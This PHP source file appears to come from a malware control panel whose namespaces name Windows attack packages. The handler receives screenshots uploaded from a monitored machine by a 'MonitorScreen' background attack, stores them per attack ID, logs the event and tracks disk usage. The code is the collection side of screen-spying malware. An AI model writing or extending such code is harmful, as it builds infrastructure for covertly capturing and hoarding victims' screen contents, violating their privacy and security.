<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorScreen\MonitorScreen $this */

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\Screenshot\Screenshot;
use Kelvinho\Virus\Singleton\Logs;

$unixTime = time();
$filePath = DATA_DIR . "/attacks/" . $this->getAttackId() . "/screen-$unixTime." . ((strpos(mime_content_type($this->requestData->filePath("screen")), "png") !== false) ? "png" : Screenshot::$IMG_EXTENSION);
$this->requestData->moveFile("screen", $filePath);
$this->saveEventFromIntercept($unixTime)->resetStaticUsage();
$this->usage()->addDisk(filesize($filePath))->saveState();
$this->reportStaticUsage()->purgeEvents();
